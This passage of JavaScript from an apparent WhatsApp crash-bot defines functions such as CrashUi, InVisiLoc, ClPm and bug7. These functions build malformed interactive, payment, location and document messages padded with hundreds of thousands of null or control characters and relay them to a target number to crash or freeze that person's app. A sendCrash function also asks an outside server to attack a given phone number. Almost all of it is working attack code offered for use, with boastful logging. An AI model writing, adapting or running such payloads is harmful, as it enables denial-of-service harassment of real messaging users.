              title: "😈дⓅℍфŜ𝓬ίⓛ丨ⓒф Čядᔕ𝔥ξя",
              hasMediaAttachment: false,
            },
            body: {
              text: "ngabi",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(jid, msg.message, {
    messageId: msg.key.id,
    participant: { jid: jid },
  });
}
    async function bug2(a, b) {
      var msg = generateWAMessageFromContent(
        a,
        proto.Message.fromObject({
          interactiveMessage: {
            header: {
              title: "Fâxz𝐂𝐫𝐚𝐬𝐡",
              hasMediaAttachment: true,
              ...(await prepareWAMessageMedia(
                {
                  image: {
                    url: "https://telegra.ph/file/b9e707fbbbea9277c9a0e.jpg",
                  },
                },
                {
                  upload: TheFaxz.waUploadToServer,
                }
              )),
            },
            body: {
              text: "",
            },
            footer: {
              text: "›          # ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊",
            },
            nativeFlowMessage: {
              messageParamsJson: "\0".repeat(50000),
            },
          },
        }),
        {
          userJid: a,
          quoted: b,
        }
      );
      await TheFaxz.relayMessage(a, msg.message, {
        participant: {
          jid: a,
        },
        messageId: msg.key.id,
      });
    }

async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseTytarget, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await TheFaxz.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
    async function bug7(a) {
      var msg = generateWAMessageFromContent(
        a,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  subtitle: " ",
                },
                body: {
                  text: " ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊",
                },
                footer: {
                  text: "xp",
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson:
                        "{ display_text : ' ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊', url : , merchant_url :  }",
                    },
                  ],
                  messageParamsJson: "\0".repeat(4240),
                },
              },
            },
          },
        }),
        {
          userJid: a,
        }
      );
      await TheFaxz.relayMessage(a, msg.message, {
        participant: {
          jid: a,
        },
        messageId: msg.key.id,
      });
    }
    async function sendPaymentInfoMessage(jid) {
    for (let i = 0; i < 2; i++) { // Loop hingga 2 kali
        try {
            await TheFaxz.relayMessage(
                jid,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadataVersion: 0x0,
                                deviceListMetadata: {}
                            },
                            interactiveMessage: {
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "payment_info",
                                            buttonParamsJson: JSON.stringify({
                                                currency: "", // Kosong, bisa menyebabkan masalah
                                                total_amount: { value: "invalid_string", offset: 2 }, // Nilai tidak valid
                                                reference_id: null, // Null, bisa menyebabkan masalah
                                                type: "physical-goods",
                                                order: {
                                                    status: "pending",
                                                    subtotal: { value: 0, offset: 2 }, // Subtotal tidak valid
                                                    order_type: "ORDER",
                                                    items: [
                                                        {
                                                            name: "", // Kosong, bisa menyebabkan masalah
                                                            amount: { value: 0, offset: 2 }, // Tidak valid
                                                            quantity: 0, // Tidak valid
                                                            sale_amount: { value: 0, offset: 2 } // Tidak valid
                                                        }
                                                    ]
                                                },
                                                payment_settings: [
                                                    {
                                                        type: "pix_static_code",
                                                        pix_static_code: {
                                                            merchant_name: "", // Kosong, bisa menyebabkan masalah
                                                            key: null, // Null, bisa menyebabkan masalah
                                                            key_type: "" // Kosong, bisa menyebabkan masalah
                                                        }
                                                    }
                                                ]
                                            })
                                        }
                                    ]
                                }
                            }
                        }
                    }
                },
                {
                    participant: { jid: jid }
                },
                { messageId: null }
            );

            console.log(`Bug ÂlwâysFâxz Pasti C1 Nih Contohnya ${jid} Cek aja (${i + 1}/2`)

            // Tambahkan jeda selama 10 detik
            await new Promise(resolve => setTimeout(resolve, 10000)); // Jeda 10 detik

        } catch (error) {
            console.error("Error sending payment info message:", error);
            break; // Keluar dari loop jika terjadi kesalahan
        }
    }
}




// Function New Bug \\
		async function sendCrash(X) {
			try {
				const newcrash = await fetchJson('http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + X);
				console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
				console.log(chalk.red("ÎÑVÎSÎBLÉ⚡"));
			} catch (error) {
				console.error("Error Fetching Crash:", error);
			}
		}
		
		const Qrad = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@faxz.attacker\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"faxz.attacker\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const VisiX = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@faxz.attacker\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const VisiXLoc = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@faxz.attacker\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		async function InVisiLoc(X, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "zangetsu🔥",
										"address": " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 🔥zangetsu メ MargaAlways🔥 ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
												"sections": [{
													"title": " ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);
			await TheFaxz.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function InVisiLocNull(X, Qtd, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̊‌‏" + "ꦾ".repeat(77777),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "zangetsu🔥",
										"address": " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 🔥zangetsu メ MargaAlways🔥 ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
												"sections": [{
													"title": " ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);
			await TheFaxz.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function InVisiLocXz(X, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "zangetsu🔥",
										"address": " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " 🔥zangetsu メ MargaAlways🔥 ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
												"sections": [{
													"title": " ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiXLoc
				}
			);
			await TheFaxz.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function InVisiXz(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: " ⟅̊༑ ▾ ⌜ 🔥zangetsu メ 𝐁𝐮𝐠🔥 ⌟ ▾ ༑̴⟆̤̊",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY ÂlwàysFâxz\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiX
				}
			);

			await TheFaxz.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function ClPm(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: " ⟅̊༑ ▾ ⌜ 🔥zangetsu メ 𝐁𝐮𝐠🔥 ⌟ ▾ ༑̴⟆̤̊",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "zangetsu🔥"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY ÂlwàysFâxz\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);

			await TheFaxz.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: " ⟅̊༑ ▾ ⌜ 🔥zangetsu メ 𝐁𝐮𝐠🔥 ⌟ ▾ ༑̴⟆̤̊",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊" + "ꦾ".repeat(77777)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY ÂlwàysFâxz\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);

			await TheFaxz.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: " ⟅̊༑ ▾ ⌜ 🔥zangetsu メ 𝐁𝐮𝐠🔥 ⌟ ▾ ༑̴⟆̤̊",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊" + "ꦾ".repeat(50000)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY ÂlwàysFâxz\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);

			await TheFaxz.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function FxZ(X, Txt, Amount, Ptcp = true) {
			await TheFaxz.relayMessage(X, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: Txt,
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
